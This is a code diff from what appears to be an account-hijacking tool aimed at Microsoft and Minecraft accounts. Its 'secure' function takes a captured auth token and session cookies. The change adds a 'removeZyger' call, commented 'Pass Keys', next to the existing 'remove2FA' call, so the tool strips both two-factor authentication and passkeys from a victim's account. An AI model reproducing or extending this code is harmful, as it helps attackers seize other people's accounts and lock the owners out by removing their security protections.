@@ -8,6 +8,7 @@ from views.utils.removeProof import removeProof
 from views.utils.getCookies import getCookies
 from views.utils.polishHost import polishHost
 from views.utils.getProfile import getProfile
+from views.utils.removeZyger import removeZyger
 from views.utils.remove2FA import remove2FA
 from views.utils.getMethod import getMethod
 from views.utils.getCapes import getCapes
@@ -136,7 +137,11 @@ def secure(msaauth: str):
             print("[+] - Got AMRP")
             proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"
 
+            # 2FA
             remove2FA(amrp, cookies[1], cookies[2])
+
+            # Pass Keys
+            removeZyger(amrp, cookies[1], cookies[2])
 
             # To be fixed ###########################################
             #                                                       #
